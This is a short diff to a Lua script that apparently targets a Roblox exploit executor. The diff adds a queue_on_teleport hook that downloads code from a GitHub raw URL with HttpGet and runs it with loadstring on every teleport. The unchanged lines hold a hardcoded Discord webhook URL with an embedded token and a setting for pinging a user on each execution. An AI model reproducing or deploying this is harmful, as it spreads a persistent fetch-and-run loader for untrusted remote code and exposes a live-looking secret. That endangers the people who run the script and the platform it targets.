@@ -1,3 +1,7 @@
+if queue_on_teleport then
+   queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/websocket/refs/heads/main/my_script.lua",true))()')
+end
+
 local Webhook = "https://discord.com/api/webhooks/1357463713233371339/-XC64XWjuLdlBFqGDha4XceEslJqu_8Q2UEzfZeQPWfP_j_igKcCu7GkZ4erpm7yv-ui" -- your webhook
 _G.Discord_UserID = "" -- ID To Ping on every execution, blank if no one wants to be pinged.
 
